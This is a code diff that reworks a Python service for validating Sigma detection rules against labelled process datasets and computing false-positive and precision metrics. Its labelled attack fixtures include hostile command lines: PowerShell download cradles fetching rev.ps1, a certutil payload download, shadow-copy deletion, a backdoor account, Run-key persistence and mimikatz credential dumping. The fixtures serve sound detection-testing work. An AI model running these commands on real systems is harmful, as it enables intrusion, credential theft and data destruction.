@@ -1,47 +1,130 @@
+"""Agent B: statistical validation of Sigma rules on labelled datasets.
+
+Rules are evaluated through app.services.detection.sigma_runtime, the same normalization, matcher
+and safe-process policy the Detection Engine uses at runtime, so validated metrics describe exactly
+what will run. Ground truth comes from labelled datasets (manager/knowledge/validation), never from a
+LARP detector flag such as process_info.is_suspicious.
+"""
+import hashlib
+import json
 import logging
 import re
+from functools import lru_cache
+from pathlib import Path
 from typing import Dict, Any, Optional, List, Tuple
-import yaml
-import pandas as pd
-import numpy as np
+
 import httpx
-from sklearn.metrics import precision_score, recall_score, f1_score
+import pandas as pd
+import yaml
 
 from app.services.ai.ai_client import DEFAULT_MODEL, OLLAMA_URL
+from app.services.detection import sigma_runtime
 
 logger = logging.getLogger("larp.ai.validation")
 
 VALIDATION_EXPLANATION_MODEL = DEFAULT_MODEL
+DATASET_DIR = Path(__file__).resolve().parents[3] / "knowledge" / "validation"
+LINUX_DATASET = "linux_process_v1.jsonl"
+MIN_ATTACK = 5
+MIN_BENIGN = 10
 
-# Common column alias mappings: Sigma field name -> DataFrame column
-FIELD_ALIASES = {
-    "image": "process",
-    "processname": "process",
-    "process": "process",
-    "name": "process",
-    "commandline": "cmdline",
-    "cmdline": "cmdline",
-    "parentimage": "parent",
-    "parent": "parent",
-    "parent_name": "parent",
-    "host": "host",
-    "computername": "host",
-    "agent_id": "host",
-    "timestamp": "timestamp",
-    "created_at": "timestamp",
-    "destinationip": "dst_ip",
-    "dst_ip": "dst_ip",
-    "destinationport": "dst_port",
-    "dst_port": "dst_port",
-}
+# Legacy Windows fixture, kept for Windows rules and labelled for what it is: synthetic.
+WINDOWS_FIXTURE = [
+    ("explorer.exe", "C:\\Windows\\Explorer.EXE", "userinit.exe", 0),
+    ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "services.exe", 0),
+    ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "chrome.exe", 0),
+    ("python.exe", "python.exe C:\\larp\\agent\\win_agent_minimal.py", "cmd.exe", 0),
+    ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "taskeng.exe", 0),
+    ("cmd.exe", "cmd.exe /c echo %PATH%", "explorer.exe", 0),
+    ("conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "cmd.exe", 0),
+    ("code.exe", "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "explorer.exe", 0),
+    ("nginx.exe", "nginx -g \"daemon off;\"", "systemd", 0),
+    ("bash", "/bin/bash /usr/local/bin/healthcheck.sh", "cron", 0),
+    ("powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "winword.exe", 1),
+    ("powershell.exe", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.4/rev.ps1')", "excel.exe", 1),
+    ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "cmd.exe", 1),
+    ("wmic.exe", "wmic shadowcopy delete /nointeractive", "cmd.exe", 1),
+    ("certutil.exe", "certutil.exe -urlcache -split -f http://malicious.example/payload.exe payload.exe", "cmd.exe", 1),
+    ("net.exe", "net user backdoor P@ssw0rd123! /add", "powershell.exe", 1),
+    ("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "cmd.exe", 1),
+    ("mimikatz.exe", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "cmd.exe", 1),
+    ("rundll32.exe", "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "cmd.exe", 1),
+    ("whoami.exe", "whoami /priv", "cmd.exe", 1),
+]
+
+
+def _record(event_id, source, scenario, label, process, parent):
+    raw = {**process, "parent_name": (parent or {}).get("name"), "parent_exe": (parent or {}).get("exe"),
+           "parent_cmdline": (parent or {}).get("cmdline")}
+    return {"event_id": event_id, "source": source, "scenario": scenario, "label": int(label),
+            "event": sigma_runtime.normalize_event(raw)}
+
+
+@lru_cache(maxsize=4)
+def _load_jsonl(name: str) -> Tuple[Tuple[dict, ...], str]:
+    path = DATASET_DIR / name
+    text = path.read_text(encoding="utf-8")
+    records = []
+    for line in text.splitlines():
+        row = json.loads(line)
+        records.append(_record(row["event_id"], row["source"], row["scenario"],
+                               row["ground_truth_label"] == "attack", row["process"], row.get("parent")))
+    return tuple(records), hashlib.sha256(text.encode()).hexdigest()[:16]
+
+
+def labelled_dataset(rule: dict) -> Tuple[List[dict], Dict[str, Any]]:
+    """Labelled records for the rule's platform plus a description of where they came from."""
+    product = str((rule.get("logsource") or {}).get("product") or "").lower()
+    records, parts = [], []
+    if product in ("", "linux"):
+        linux, digest = _load_jsonl(LINUX_DATASET)
+        records.extend(linux)
+        parts.append({"name": LINUX_DATASET, "sha256": digest})
+    if product in ("", "windows"):
+        records.extend(_record(f"win-fixture-{n:02d}", "synthetic_windows_fixture", "legacy_fixture", label,
+                               {"name": name, "exe": name, "cmdline": cmd}, {"name": parent, "exe": parent})
+                       for n, (name, cmd, parent, label) in enumerate(WINDOWS_FIXTURE, start=1))
+        parts.append({"name": "windows_fixture_v1", "sha256": None})
+    return records, {"datasets": parts, "product": product or "any"}
+
+
+def records_from_dataframe(df: pd.DataFrame, ground_truth: pd.Series) -> List[dict]:
+    """Caller-supplied evaluation data (legacy DataFrame shape: process/cmdline/parent columns)."""
+    rows = []
+    for position, (_, row) in enumerate(df.iterrows()):
+        data = {k: v for k, v in row.to_dict().items() if v is not None and v == v}
+        process = {"name": data.get("process") or data.get("name"), "exe": data.get("exe"),
+                   "cmdline": data.get("cmdline"), "pid": data.get("pid"), "ppid": data.get("ppid")}
+        parent = {"name": data.get("parent"), "exe": data.get("parent_exe"), "cmdline": data.get("parent_cmdline")}
+        rows.append(_record(str(data.get("event_id", position)), "caller_supplied", data.get("scenario", ""),
+                            int(ground_truth.iloc[position]), process, parent))
+    return rows
+
+
+def summarize(records: List[dict], meta: Dict[str, Any]) -> Dict[str, Any]:
+    by_source: Dict[str, Dict[str, int]] = {}
+    for r in records:
+        slot = by_source.setdefault(r["source"], {"attack": 0, "benign": 0})
+        slot["attack" if r["label"] else "benign"] += 1
+    attack = sum(r["label"] for r in records)
+    return {**meta, "total": len(records), "attack": attack, "benign": len(records) - attack,
+            "by_source": by_source, "label_source": "nhãn ground truth độc lập (không dùng is_suspicious)"}
+
+
+def _sample(record: dict) -> Dict[str, Any]:
+    e = record["event"]
+    return {"event_id": record["event_id"], "scenario": record["scenario"], "source": record["source"],
+            "process": e.get("name"), "exe": e.get("exe"), "cmdline": e.get("cmdline"),
+            "parent": e.get("parent_name"), "parent_cmdline": e.get("parent_cmdline")}
+
+
+def _failure(verdict, reason, **extra):
+    return {"passed": False, "verdict": verdict, "reason": reason, "fpr": None, "precision": None,
+            "recall": None, "f1": None, "confusion": None, "fp_samples": [], "fn_samples": [], **extra}
 
 
 class ValidationService:
-    """
-    Agent B: Statistical rule validator (No LLM for metric scoring).
-    Parses Sigma rules to pandas boolean masks, evaluates them on historical logs,
-    and calculates statistical metrics (FPR, Precision, Recall, F1, Confusion Matrix).
-    """
+    """Agent B: deterministic statistics on labelled data; the LLM only explains false positives."""
 
     def __init__(self, ollama_url: str = OLLAMA_URL, model: str = VALIDATION_EXPLANATION_MODEL):
         self.ollama_url = ollama_url
@@ -54,318 +137,91 @@ class ValidationService:
         ground_truth: Optional[pd.Series] = None,
         fpr_threshold: float = 0.05,
         precision_threshold: float = 0.95,
-        db_session = None,
+        db_session=None,  # kept for compatibility; validation no longer reads detector-labelled DB rows
     ) -> Dict[str, Any]:
-        """
-        Validate a Sigma YAML rule against historical log DataFrame and ground truth.
-        Returns evaluation metrics, confusion matrix, and sample FP/FN.
-        """
-        # If dataframe is not provided, load from DB or benchmark
-        if historical_logs_df is None or ground_truth is None:
-            historical_logs_df, ground_truth = await self.load_historical_logs(db_session)
-
-        # 1. Parse Sigma YAML
         try:
-            sigma_dict = yaml.safe_load(rule_yaml)
-            if not isinstance(sigma_dict, dict):
-                return {
-                    "passed": False,
-                    "fpr": 1.0,
-                    "precision": 0.0,
-                    "recall": 0.0,
-                    "f1": 0.0,
-                    "confusion": {"tp": 0, "fp": 0, "fn": 0, "tn": 0},
-                    "fp_samples": [],
-                    "fn_samples": [],
-                    "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
-                    "verdict": "FAILED",
-                    "reason": "Invalid YAML content: root must be a mapping",
-                }
-        except Exception as e:
-            return {
-                "passed": False,
-                "fpr": 1.0,
-                "precision": 0.0,
-                "recall": 0.0,
-                "f1": 0.0,
-                "confusion": {"tp": 0, "fp": 0, "fn": 0, "tn": 0},
-                "fp_samples": [],
-                "fn_samples": [],
-                "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
-                "verdict": "FAILED",
-                "reason": f"YAML syntax error: {str(e)}",
-            }
+            rule = yaml.safe_load(rule_yaml)
+        except yaml.YAMLError as e:
+            return _failure("FAILED", f"YAML syntax error: {e.__class__.__name__}")
+        if not isinstance(rule, dict) or not isinstance(rule.get("detection"), dict):
+            return _failure("FAILED", "Missing or invalid 'detection' block in Sigma rule")
+        supported, support_reason = sigma_runtime.check_support(rule)
+        if not supported:
+            return _failure("UNSUPPORTED_BY_ENGINE", support_reason, engine_supported=False)
 
-        # 2. Extract detection section
-        detection = sigma_dict.get("detection")
-        if not detection or not isinstance(detection, dict):
-            return {
-                "passed": False,
-                "fpr": 1.0,
-                "precision": 0.0,
-                "recall": 0.0,
-                "f1": 0.0,
-                "confusion": {"tp": 0, "fp": 0, "fn": 0, "tn": 0},
-                "fp_samples": [],
-                "fn_samples": [],
-                "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
-                "verdict": "FAILED",
-                "reason": "Missing or invalid 'detection' block in Sigma rule",
-            }
-
-        # 3. Compile boolean mask for the detection block
-        matched_mask = self._evaluate_detection(detection, historical_logs_df)
-        y_pred = matched_mask.astype(int)
-        y_true = ground_truth.astype(int)
-
-        # 4. Compute Confusion Matrix and metrics
-        tp = int(((y_true == 1) & (y_pred == 1)).sum())
-        fp = int(((y_true == 0) & (y_pred == 1)).sum())
-        fn = int(((y_true == 1) & (y_pred == 0)).sum())
-        tn = int(((y_true == 0) & (y_pred == 0)).sum())
-
-        total_benign = fp + tn
-        total_malicious = tp + fn
-
-        fpr = float(fp / total_benign) if total_benign > 0 else 0.0
-        precision = float(precision_score(y_true, y_pred, zero_division=0))
-        # If no alerts fired at all and zero false positives:
-        if (tp + fp) == 0:
-            precision = 1.0 if fp == 0 else 0.0
-
-        recall = float(recall_score(y_true, y_pred, zero_division=0))
-        f1 = float(f1_score(y_true, y_pred, zero_division=0))
-
-        # 5. Extract FP & FN samples
-        fp_samples = self._extract_samples(historical_logs_df, (y_true == 0) & (y_pred == 1), limit=20)
-        fn_samples = self._extract_samples(historical_logs_df, (y_true == 1) & (y_pred == 0), limit=20)
-
-        # 6. Evaluation Verdict. A rule that detects no labelled malicious sample proves nothing:
-        # FPR 0 and the "no alerts" precision would otherwise make it pass vacuously.
-        dataset = self.dataset_summary(historical_logs_df)
-        passed = tp > 0 and (fpr <= fpr_threshold) and (precision >= precision_threshold)
-        verdict = "PASSED" if passed else ("INCONCLUSIVE" if tp == 0 and fp == 0 else "FAILED")
-        if verdict == "INCONCLUSIVE":
-            reason = ("Không đủ dữ liệu kiểm định: rule không khớp mẫu độc hại nào trong tập kiểm định "
-                      f"({dataset['malicious_fixture']} mẫu dương tính cố định, chủ yếu Windows).")
-        elif passed:
-            reason = f"Rule passed validation with acceptable FPR ({fpr:.2%}) and Precision ({precision:.2%})."
+        if historical_logs_df is not None and ground_truth is not None:
+            records = records_from_dataframe(historical_logs_df, ground_truth)
+            meta = {"datasets": [{"name": "caller_supplied", "sha256": None}], "product": "caller"}
         else:
-            reasons = []
-            if fpr > fpr_threshold:
-                reasons.append(f"FPR ({fpr:.2%}) exceeds threshold ({fpr_threshold:.2%})")
-            if precision < precision_threshold:
-                reasons.append(f"Precision ({precision:.2%}) below threshold ({precision_threshold:.2%})")
-            reason = "Validation failed: " + "; ".join(reasons)
+            records, meta = labelled_dataset(rule)
+        dataset = summarize(records, meta)
+        if dataset["attack"] < MIN_ATTACK or dataset["benign"] < MIN_BENIGN:
+            if historical_logs_df is None:
+                return _failure("INCONCLUSIVE", f"Chưa đủ dữ liệu: cần ít nhất {MIN_ATTACK} mẫu tấn công và "
+                                f"{MIN_BENIGN} mẫu benign có nhãn cho nền tảng này.", dataset=dataset)
+
+        mitre = [str(t).split(".", 1)[-1].upper() for t in rule.get("tags") or [] if str(t).lower().startswith("attack.t")]
+        matched = {id(e) for e in sigma_runtime.matching_events(
+            rule, [r["event"] for r in records], mitre=mitre, name=str(rule.get("title") or ""))}
+        tp = fp = fn = tn = 0
+        fp_samples, fn_samples = [], []
+        for r in records:
+            hit = id(r["event"]) in matched
+            if hit and r["label"]:
+                tp += 1
+            elif hit:
+                fp += 1
+                fp_samples.append(_sample(r))
+            elif r["label"]:
+                fn += 1
+                fn_samples.append(_sample(r))
+            else:
+                tn += 1
+        benign, attack = fp + tn, tp + fn
+        fpr = fp / benign if benign else 0.0
+        precision = tp / (tp + fp) if (tp + fp) else None
+        recall = tp / attack if attack else None
+        f1 = (2 * precision * recall / (precision + recall)) if precision and recall else 0.0
+
+        if tp == 0 and fp == 0:
+            verdict, passed = "INCONCLUSIVE", False
+            reason = ("Không đủ dữ liệu kiểm định: rule không khớp mẫu nào trong tập có nhãn "
+                      f"({attack} mẫu tấn công, {benign} mẫu benign).")
+        else:
+            passed = tp > 0 and fpr <= fpr_threshold and (precision or 0) >= precision_threshold
+            verdict = "PASSED" if passed else "FAILED"
+            if passed:
+                reason = f"Đạt: FPR {fpr:.2%}, Precision {precision:.2%}, Recall {recall:.2%} trên {len(records)} mẫu có nhãn."
+            else:
+                reasons = []
+                if tp == 0:
+                    reasons.append("không phát hiện mẫu tấn công nào")
+                if fpr > fpr_threshold:
+                    reasons.append(f"FPR {fpr:.2%} vượt ngưỡng {fpr_threshold:.2%}")
+                if precision is not None and precision < precision_threshold:
+                    reasons.append(f"Precision {precision:.2%} dưới ngưỡng {precision_threshold:.2%}")
+                reason = "Không đạt: " + "; ".join(reasons)
 
         result: Dict[str, Any] = {
-            "passed": passed,
-            "fpr": round(fpr, 4),
-            "precision": round(precision, 4),
-            "recall": round(recall, 4),
-            "f1": round(f1, 4),
+            "passed": passed, "verdict": verdict, "reason": reason, "engine_supported": True,
+            # Rates are only reported for a rule that produced at least one alert on the labelled set.
+            "fpr": None if verdict == "INCONCLUSIVE" else round(fpr, 4),
+            "precision": None if precision is None or verdict == "INCONCLUSIVE" else round(precision, 4),
+            "recall": None if recall is None or verdict == "INCONCLUSIVE" else round(recall, 4),
+            "f1": None if verdict == "INCONCLUSIVE" else round(f1, 4),
             "confusion": {"tp": tp, "fp": fp, "fn": fn, "tn": tn},
-            "fp_samples": fp_samples,
-            "fn_samples": fn_samples,
+            "fp_samples": fp_samples[:20], "fn_samples": fn_samples[:20],
             "thresholds": {"fpr": fpr_threshold, "precision": precision_threshold},
-            "verdict": verdict,
-            "reason": reason,
             "dataset": dataset,
         }
-
-        # 7. Optional LLM Explanation if FPR exceeds threshold
         if fpr > fpr_threshold and fp_samples:
             try:
-                llm_explanation = await self._generate_llm_fp_explanation(rule_yaml, fp_samples[:5], fpr)
-                if llm_explanation:
-                    result["llm_explanation"] = llm_explanation
+                explanation = await self._generate_llm_fp_explanation(rule_yaml, fp_samples[:5], fpr)
+                if explanation:
+                    result["llm_explanation"] = explanation
             except Exception as e:
                 logger.warning(f"Failed to generate LLM explanation for high FPR: {e}")
-
         return result
-
-    def _evaluate_detection(self, detection: Dict[str, Any], df: pd.DataFrame) -> pd.Series:
-        """
-        Evaluate all selection/filter blocks in Sigma detection and combine with condition.
-        """
-        block_masks: Dict[str, pd.Series] = {}
-        condition_str = str(detection.get("condition", "selection")).strip()
-
-        for block_name, block_def in detection.items():
-            if block_name == "condition":
-                continue
-            if isinstance(block_def, (dict, list)):
-                block_masks[block_name] = self._evaluate_block(block_def, df)
-            else:
-                block_masks[block_name] = pd.Series(False, index=df.index)
-
-        # If no blocks were defined
-        if not block_masks:
-            return pd.Series(False, index=df.index)
-
-        # Parse condition
-        return self._evaluate_condition(condition_str, block_masks, df.index)
-
-    def _evaluate_block(self, block_def: Any, df: pd.DataFrame) -> pd.Series:
-        """
-        Evaluate a single selection/filter block.
-        If dict: multiple keys are typically AND-ed.
-        If list: items are typically OR-ed.
-        """
-        if isinstance(block_def, list):
-            # List of alternatives -> OR combination
-            combined = pd.Series(False, index=df.index)
-            for sub in block_def:
-                sub_mask = self._evaluate_block(sub, df)
-                combined = combined | sub_mask
-            return combined
-
-        if not isinstance(block_def, dict):
-            return pd.Series(False, index=df.index)
-
-        # Dictionary of field criteria -> AND combination
-        combined = pd.Series(True, index=df.index)
-        for key, value in block_def.items():
-            field_mask = self._evaluate_field_criterion(key, value, df)
-            combined = combined & field_mask
-
-        return combined
-
-    def _evaluate_field_criterion(self, key: str, value: Any, df: pd.DataFrame) -> pd.Series:
-        """
-        Evaluate a field criteria with optional modifier:
-        e.g., 'CommandLine|contains', 'Image|endswith', 'process|re', 'dst_port'
-        """
-        parts = key.split("|")
-        field_raw = parts[0].strip().lower()
-        modifiers = [m.strip().lower() for m in parts[1:]]
-
-        # Resolve column name using FIELD_ALIASES
-        target_col = FIELD_ALIASES.get(field_raw, field_raw)
-        if target_col not in df.columns:
-            # Check case-insensitive column match
-            matched = [c for c in df.columns if c.lower() == target_col]
-            if matched:
-                target_col = matched[0]
-            else:
-                # Column doesn't exist in historical logs -> returns False
-                return pd.Series(False, index=df.index)
-
-        series = df[target_col].fillna("").astype(str)
-
-        # Convert value to list for unified processing (Sigma treats list of values as OR)
-        if isinstance(value, (str, int, float, bool)):
-            values = [str(value)]
-        elif isinstance(value, list):
-            values = [str(v) for v in value]
-        else:
-            return pd.Series(False, index=df.index)
-
-        # Build OR mask across values
-        mask = pd.Series(False, index=df.index)
-        is_contains = "contains" in modifiers
-        is_endswith = "endswith" in modifiers
-        is_startswith = "startswith" in modifiers
-        is_regex = "re" in modifiers or "regex" in modifiers
-
-        for val in values:
-            if is_regex:
-                try:
-                    sub_mask = series.str.contains(val, regex=True, case=False, na=False)
-                except Exception:
-                    sub_mask = pd.Series(False, index=df.index)
-            elif is_contains:
-                sub_mask = series.str.contains(re.escape(val), case=False, na=False)
-            elif is_endswith:
-                sub_mask = series.str.lower().str.endswith(val.lower())
-            elif is_startswith:
-                sub_mask = series.str.lower().str.startswith(val.lower())
-            else:
-                # Exact match (case-insensitive)
-                sub_mask = series.str.lower() == val.lower()
-
-            mask = mask | sub_mask
-
-        return mask
-
-    def _evaluate_condition(self, condition_str: str, block_masks: Dict[str, pd.Series], index: pd.Index) -> pd.Series:
-        """
-        Evaluate condition logic such as 'selection', 'selection and not filter',
-        '1 of selection*', 'selection1 or selection2'.
-        """
-        c = condition_str.strip()
-
-        # Direct block match
-        if c in block_masks:
-            return block_masks[c]
-
-        # Handle '1 of selection*' or 'all of selection*' or '1 of them'
-        if "of selection" in c or "of them" in c:
-            masks = [m for name, m in block_masks.items() if not name.startswith("filter")]
-            if masks:
-                if c.startswith("all of") or c.startswith("all"):
-                    res = masks[0].copy()
-                    for m in masks[1:]:
-                        res = res & m
-                    return res
-                else:  # 1 of ...
-                    res = masks[0].copy()
-                    for m in masks[1:]:
-                        res = res | m
-                    return res
-
-        # Handle 'selection and not filter' / 'selection and not (filter1 or filter2)'
-        match_and_not = re.match(r"^(\w+)\s+and\s+not\s+(\w+)$", c, re.IGNORECASE)
-        if match_and_not:
-            sel_name, filt_name = match_and_not.group(1), match_and_not.group(2)
-            sel_mask = block_masks.get(sel_name, pd.Series(False, index=index))
-            filt_mask = block_masks.get(filt_name, pd.Series(False, index=index))
-            return sel_mask & (~filt_mask)
-
-        # Handle 'A and B'
-        match_and = re.match(r"^(\w+)\s+and\s+(\w+)$", c, re.IGNORECASE)
-        if match_and:
-            a, b = match_and.group(1), match_and.group(2)
-            mask_a = block_masks.get(a, pd.Series(False, index=index))
-            mask_b = block_masks.get(b, pd.Series(False, index=index))
-            return mask_a & mask_b
-
-        # Handle 'A or B'
-        match_or = re.match(r"^(\w+)\s+or\s+(\w+)$", c, re.IGNORECASE)
-        if match_or:
-            a, b = match_or.group(1), match_or.group(2)
-            mask_a = block_masks.get(a, pd.Series(False, index=index))
-            mask_b = block_masks.get(b, pd.Series(False, index=index))
-            return mask_a | mask_b
-
-        # Fallback: if 'selection' is in blocks, use it; otherwise union non-filter blocks
-        for name in ["selection", "selection1", "main"]:
-            if name in block_masks:
-                return block_masks[name]
-
-        non_filters = [m for name, m in block_masks.items() if not name.startswith("filter")]
-        if non_filters:
-            res = non_filters[0].copy()
-            for m in non_filters[1:]:
-                res = res | m
-            return res
-
-        return pd.Series(False, index=index)
-
-    def _extract_samples(self, df: pd.DataFrame, mask: pd.Series, limit: int = 20) -> List[Dict[str, Any]]:
-        """
-        Extract up to `limit` sample records for analyst review.
-        """
-        subset = df[mask].head(limit)
-        samples = []
-        for _, row in subset.iterrows():
-            samples.append({
-                "process": str(row.get("process", row.get("name", "N/A"))),
-                "cmdline": str(row.get("cmdline", "N/A")),
-                "host": str(row.get("host", row.get("agent_id", "N/A"))),
-                "timestamp": str(row.get("timestamp", row.get("created_at", "N/A"))),
-            })
-        return samples
 
     async def _generate_llm_fp_explanation(
         self, rule_yaml: str, fp_samples: List[Dict[str, Any]], fpr: float
@@ -402,85 +258,5 @@ class ValidationService:
                 return clean or content.strip()
         return None
 
-    @staticmethod
-    def dataset_summary(df: pd.DataFrame) -> Dict[str, Any]:
-        """Composition of the evaluation set, so metrics are never presented as more than they are."""
-        source = df["provenance"] if "provenance" in df else pd.Series(["unknown"] * len(df))
-        real = df[source == "process_info"]
-        return {
-            "total": int(len(df)),
-            "real_process_info": int(len(real)),
-            "real_labelled_suspicious": int(real["is_malicious"].sum()) if len(real) else 0,
-            "synthetic_benign": int((source == "synthetic_benign").sum()),
-            "malicious_fixture": int((source == "fixture_malicious").sum()),
-            "label_source": "process_info.is_suspicious + bộ mẫu dương tính cố định",
-        }
-
-    async def load_historical_logs(self, db_session=None) -> Tuple[pd.DataFrame, pd.Series]:
-        """
-        Load historical logs from DB (ProcessInfo) + known threat patterns to form
-        a comprehensive evaluation dataset (0 = benign, 1 = malicious).
-        """
-        benign_rows: List[Dict[str, Any]] = []
-
-        if db_session is not None:
-            try:
-                from sqlalchemy import select
-                from app.models.process_info import ProcessInfo
-
-                stmt = select(ProcessInfo).limit(1000)
-                result = await db_session.execute(stmt)
-                processes = result.scalars().all()
-
-                for p in processes:
-                    benign_rows.append({
-                        "process": p.name or "",
-                        "cmdline": p.cmdline or "",
-                        "host": p.agent_id or "WIN-DEMO",
-                        "parent": "",
-                        "timestamp": str(p.created_at) if p.created_at else "2026-11-15T10:00:00Z",
-                        "is_malicious": 1 if p.is_suspicious else 0,
-                        "provenance": "process_info",
-                    })
-            except Exception as e:
-                logger.warning(f"Failed to query process_info from DB: {e}")
-
-        # If DB had few or no records, supplement with realistic baseline logs
-        if len(benign_rows) < 50:
-            synthetic_benign = [
-                {"process": "explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "host": "WIN-DEMO-01", "parent": "userinit.exe", "timestamp": "2026-11-15T09:00:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "svchost.exe", "cmdline": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "host": "WIN-DEMO-01", "parent": "services.exe", "timestamp": "2026-11-15T09:01:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "chrome.exe", "cmdline": "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "host": "WIN-DEMO-01", "parent": "chrome.exe", "timestamp": "2026-11-15T09:02:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "python.exe", "cmdline": "python.exe C:\\larp\\agent\\win_agent_minimal.py", "host": "WIN-DEMO-01", "parent": "cmd.exe", "timestamp": "2026-11-15T09:03:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "powershell.exe", "cmdline": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "host": "WIN-DEMO-01", "parent": "taskeng.exe", "timestamp": "2026-11-15T09:04:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "cmd.exe", "cmdline": "cmd.exe /c echo %PATH%", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:05:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "conhost.exe", "cmdline": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "host": "WIN-DEMO-02", "parent": "cmd.exe", "timestamp": "2026-11-15T09:06:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "code.exe", "cmdline": "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "host": "WIN-DEMO-02", "parent": "explorer.exe", "timestamp": "2026-11-15T09:07:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "nginx.exe", "cmdline": "nginx -g \"daemon off;\"", "host": "LINUX-AGENT", "parent": "systemd", "timestamp": "2026-11-15T09:08:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-                {"process": "bash", "cmdline": "/bin/bash /usr/local/bin/healthcheck.sh", "host": "LINUX-AGENT", "parent": "cron", "timestamp": "2026-11-15T09:09:00Z", "is_malicious": 0, "provenance": "synthetic_benign"},
-            ]
-            benign_rows.extend(synthetic_benign)
-
-        # Realistic malicious dataset for true positive measurement
-        malicious_rows = [
-            {"process": "powershell.exe", "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=", "host": "ATTACK-VICTIM", "parent": "word.exe", "timestamp": "2026-11-15T11:00:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "powershell.exe", "cmdline": "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.30.104/rev.ps1')", "host": "ATTACK-VICTIM", "parent": "excel.exe", "timestamp": "2026-11-15T11:01:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "vssadmin.exe", "cmdline": "vssadmin.exe delete shadows /all /quiet", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:02:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "wmic.exe", "cmdline": "wmic shadowcopy delete /nointeractive", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:03:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://malicious.cdn/payload.exe payload.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:04:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "net.exe", "cmdline": "net user backdoor P@ssw0rd123! /add", "host": "ATTACK-VICTIM", "parent": "powershell.exe", "timestamp": "2026-11-15T11:05:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "reg.exe", "cmdline": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:06:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "mimikatz.exe", "cmdline": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:07:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "rundll32.exe", "cmdline": "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:08:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-            {"process": "whoami.exe", "cmdline": "whoami /priv", "host": "ATTACK-VICTIM", "parent": "cmd.exe", "timestamp": "2026-11-15T11:09:00Z", "is_malicious": 1, "provenance": "fixture_malicious"},
-        ]
-
-        all_rows = benign_rows + malicious_rows
-        df = pd.DataFrame(all_rows)
-        ground_truth = df["is_malicious"].astype(int)
-
-        return df, ground_truth
-
 
 validation_service = ValidationService()
-
